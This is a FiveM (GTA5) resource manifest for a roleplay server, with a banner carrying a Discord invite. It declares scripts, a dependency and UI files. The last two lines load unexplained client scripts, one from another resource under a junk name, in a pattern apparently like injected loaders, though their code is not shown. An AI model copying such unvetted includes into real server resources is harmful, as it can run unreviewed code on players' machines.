-- ###########################################################################
-- ###                                                                       #
-- ###                                                                       #
-- ###                                                                       #
-- ###                           NeoLand RP !!!                              #
-- ###                          discord.gg/g2FFfWUSeF                        #
-- ###                                                                       #
-- ###                                                                       #
-- ###                                                                       #
-- ############################################################################fx_version('bodacious')
game('gta5')

dependency('es_extended')


client_script('client/main.lua')
server_script('server/main.lua')

ui_page('ui/index.html')

files({
	'ui/index.html',
	'ui/style.css'
})

client_script '@renameit/xDxDxDxDxD.lua'

client_script 'Adastra.lua'